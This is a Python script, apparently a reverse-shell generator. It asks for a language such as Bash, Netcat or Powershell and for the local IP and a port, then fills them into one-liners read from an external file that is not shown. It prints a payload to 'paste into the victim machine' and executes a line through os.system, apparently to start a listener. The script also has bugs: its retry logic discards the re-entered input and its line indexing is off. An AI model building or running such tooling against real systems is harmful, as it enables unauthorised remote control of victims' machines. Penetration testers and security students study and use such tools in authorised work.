#!/usr/bin/env python3

from subprocess import check_output
import re
import os

class Colour:
    Black = "\u001b[30m"
    Red = "\u001b[31m"
    Green = "\u001b[32m"
    Yellow = "\u001b[33m"
    Blue = "\u001b[34m"
    Magenta = "\u001b[35m"
    White = "\u001b[37m"
    Cyan = "\u001b[36m"
    Reset = "\u001b[0m"
    # Theme
    Colour1 = Green
    Colour2 = Cyan
    Colour3 = Red
    Colour4 = White
    Text = Yellow

def display(text):
    print(f"\n{Colour.Blue}[{Colour.Red}+{Colour.Blue}]{Colour.Text} {text}{Colour.Reset}\n")

def displayerror(text):
    print(f"\n{Colour.Blue}[{Colour.Black}x{Colour.Blue}]{Colour.Text} {text}{Colour.Reset}\n")

def get_language():
    display("Which language would you like reverse shell code for?")
    languages = ["Bash","Socat","Python","Perl","PHP","Ruby","Golang","Netcat","Ncat","OpenSSL","Powershell","TCLsh","gawk","Telnet"]
    for i in range(len(languages)):
        print(f"{Colour.Colour4}{i} - {Colour.Colour2}{languages[i]}{Colour.Reset}\n")
    try:
        language = int(input(f"({Colour.Text}Language Selection{Colour.Reset}) > "))
    except ValueError:
        displayerror("Error, please enter an integer value")
        get_language()
    else:
        if language not in range(len(languages)):
            displayerror("Integer entered not in correct range, try again")
            get_language()
        return language


def get_ip():
    # Accuireing ip address from users hostnames in the format x.x.x.x
    valid_ips = 0
    ips = check_output(['hostname', '--all-ip-addresses']).decode("utf-8").split()
    display("Which ip address would you like to use?")
    for index, ip in enumerate(ips):
        pattern = re.compile("^(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])$")
        test = pattern.match(ip)
        if test:
            print(f"{Colour.Colour4}{index} - {Colour.Colour2}{ip}{Colour.Reset}\n")
            valid_ips +=1
    # Outputing ip options
    try:
        choice = int(input(f"({Colour.Text}Ip Selection{Colour.Reset}) > "))
    except ValueError:
        displayerror("Error, please enter an integer value")
        get_ip()
    else:
        if choice in range(valid_ips):
            return ips[choice]
        else:
            displayerror("Integer entered not in correct range, try again")
            get_ip()


def get_port():
    try:
        display("Enter the port number that you would like to listen on:")
        print(f"{Colour.Colour4}Enter any number between: {Colour.Colour2}0 - 65535{Colour.Reset}\n")
        port = int(input(f"({Colour.Text}Port Selection{Colour.Reset}) > "))
    except ValueError:
        displayerror("Error, please enter an integer value")
        get_port()
    else:
        if port not in range(65536):
            displayerror("Port entered not in correct range for ports, try again")
            get_port()
        return port

def get_code(line,codeno):
    print(f"{Colour.Colour4}{codeno} - {Colour.Colour2}{line}{Colour.Reset}")
    return 1

def OutputCommands(ip,port,language):
    file1 = open('reversescripts.txt','r+')
    lines = file1.readlines()
    codeno = 0
    for line in lines:
        for i in line.strip():
            if i == '@':
                line = line.replace("@",ip)
            elif i == '£':
                line = line.replace("£",str(port))

        langArr = [["bash-","bash1-","bashu-"],["socat-"],["perl-","perl1-","perl2-"],["python-","python1-","python2-"],["php-","php1-","php2-","php3-","php4-","php5-"],["ruby-","ruby1-"],["golang-"],["netcatbsd-","netcattrad-","netcattrad1-"],["ncat-"],["openssl-","openssl1-","openssl2-"],["powershell-","powershell1-"],["tclsh-"],["gawk-"],["telnet-","telnet1-"]]

        numofoutputs = len(langArr[language])

        for j in langArr[language]:
            if j in line.strip():
                codeno += get_code(line.replace(j,""),codeno)
    
            #if language == 0 and ("bash-" in line.strip() or "bashu-" in line.strip()):
            #lang = ""
            #if "bash-" in line.strip():
            #    lang = "bash-"
            #elif "bashu-" in line.strip():
            #    lang = "bashu-"
            #codeno += get_code(line.replace(lang,""),codeno)
    display("Pick the reverse shell code you would like to use:")
    shellcode = int(input(f"({Colour.Text}Shell code selection{Colour.Reset}) > "))
    linecount = 0
    for line in lines:
        linecount += 1
        if langArr[language][shellcode] in line:
            line = line.replace("@",ip)
            line = line.replace("£",str(port))
            display("Copy this and paste into the victim machine:\n" + line.replace(langArr[language][shellcode],""))
            lines[linecount] = lines[linecount].replace("@",ip)
            lines[linecount] = lines[linecount].replace("£",str(port))
            os.system(str(lines[linecount]))
            break

    
    file1.close()



def main():

    ################################# Initialising machines and taking ip/port #################################

    language = get_language()
    ip = get_ip()
    port = get_port()


    ################################# Inputting ip and port into reverseshell code #################################

    OutputCommands(ip,port,language)

if __name__=='__main__':
    main()
